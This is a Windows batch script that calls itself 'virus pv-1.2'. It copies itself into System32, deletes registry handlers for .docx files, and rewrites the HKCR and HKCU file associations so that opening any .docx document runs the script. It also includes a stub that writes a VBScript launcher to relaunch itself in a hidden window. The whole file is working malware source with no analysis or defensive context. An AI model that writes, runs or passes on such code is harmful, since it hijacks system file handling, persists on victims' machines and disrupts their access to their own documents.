@echo off

goto t1
(echo.set sh=CreateObject^("Wscript.Shell"^)
echo.sh.Run """%~nx0"" 1", 0)>launch.vbs
if "%~1"=="" (start "" "launch.vbs"&exit /b)
:t1

@set path="C:\Windows\System32"

@if not exist %path%\pv1.2.bat goto point1
@if exist %path%\pv1.2.bat @DEL %path%\pv1.2.bat /Q

:point1
@copy pv1.2.bat %path%

@c:\windows\system32\reg.exe DELETE HKEY_CLASSES_ROOT\.docx\OpenWithList /f
@c:\windows\system32\reg.exe DELETE HKEY_CLASSES_ROOT\.docx\PersistentHandler /f

@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\.docx /d "docxmodfile" /f
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\.docx /v PerceivedType /d "moddocument" /f

@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxmodfile /f
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxmodfile /d "moddocument" /f
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxmodfile /v "FriendlyTypeName" /t "REG_EXPAND_SZ" /f /d "@C:\Windows\System32\pv1.2.bat, -300" 
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxmodfile\shell\open\command /t "REG_EXPAND_SZ" /f /d "\"C:\Windows\System32\pv1.2.bat\" \"%%1\""


@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxfile /f
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxfile /d "moddocument" /f
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxfile /v "FriendlyTypeName" /t "REG_EXPAND_SZ" /f /d "@C:\Windows\System32\pv1.2.bat, -300" 
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\docxfile\shell\open\command /t "REG_EXPAND_SZ" /f /d "\"C:\Windows\System32\pv1.2.bat\" \"%%1\""



@c:\windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.docx\OpenWithList /v "a" /f /d "\"C:\Windows\System32\pv1.2.bat\"" 
@c:\windows\system32\reg.exe add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.docx\OpenWithList /v "b" /f /d "\"C:\Windows\System32\pv1.2.bat\"" 
@c:\windows\system32\reg.exe add HKEY_CLASSES_ROOT\CLSID\{698A4FFC-63A3-4E70-8F00-376AD29363FB} /f /d "docxmodfile" 

@cls
@echo virus pv-1.2 (HKCR-placed) injected 
@pause



